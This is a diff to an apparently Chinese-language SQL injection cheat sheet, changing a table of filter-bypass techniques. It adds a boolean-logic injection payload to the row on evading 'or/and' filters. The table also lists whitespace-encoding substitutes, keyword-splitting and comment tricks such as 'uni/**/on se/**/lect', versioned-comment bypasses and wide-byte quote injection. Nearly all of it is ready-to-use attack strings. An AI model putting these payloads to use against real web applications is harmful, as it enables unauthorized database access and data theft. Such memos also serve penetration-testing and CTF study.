@@ -241,7 +241,7 @@ var_dump($sql2);
 # **7 绕过姿势备忘录**
 |相关姿势                          |                      具体描述
 -|-|
-|or and过滤                        |	大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/\*or\*/<br>利用符号 and=&& or=\|\|<br>admin'%(ascii(mid(database()) from 1 for 1)=90)%'1<br>admin'^(1)^'1'|
+|or and过滤                        |	大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/\*or\*/<br>利用符号 and=&& or=\|\|<br>admin'%(ascii(mid(database()) from 1 for 1)=90)%'1<br>admin'^(1)^'1'<br>SELECT * from user where id = ''!=!!(1=2)!=!!'1'|
 |空格过滤                           | %09 TAB键（水平）%0a 新建一行 %0c 新的一页 %0d return功能 %0b TAB键（垂直） %a0 空格 |
 |关键字的绕过                       | 注释符绕过:uni/\*\*/on se/\*\*/lect <br> 大小写绕过:UniOn SeleCt <br> 双关键字绕过:ununionion seselectlect <br> <>绕过:unio<>n sel<>ect <br>/\*!00000select\*/绕过关键字和正则过滤
 |宽字节注入                        | 过滤单引号时，可以试试宽字节%bf%27 %df%27 %aa%27|
